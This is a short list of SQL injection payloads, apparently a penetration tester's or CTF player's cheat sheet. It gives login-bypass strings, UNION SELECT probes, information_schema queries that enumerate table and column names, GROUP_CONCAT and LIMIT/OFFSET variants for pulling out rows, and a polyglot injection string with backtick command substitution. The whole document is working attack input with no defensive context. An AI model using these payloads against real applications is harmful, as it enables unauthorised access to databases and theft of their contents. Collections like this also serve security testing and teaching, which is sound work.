# basic
' or 1='1
" or 1="1


# union select
' union select 1,2,3;--+
" union select 1,2,3;-- 


# data exfiltration
' union select 1,table_name,3 from information_schema.tables;--+
" union select 1,2,column_name from information_schema.columns;--+




# Group concat
# good for joining stuff in a subquery
" union select group_concat(table_name),2,3,4,5 from information_schema.tables;--+



# limit offset
# limit 1 is good for subqueries
# offset is good for finding rows other than first row

" union select 1,2,table_name from information_schema.tables limit 1 offset 50;--+


# polyglot
"'<lol/>`ls`#--+;~//+@@ 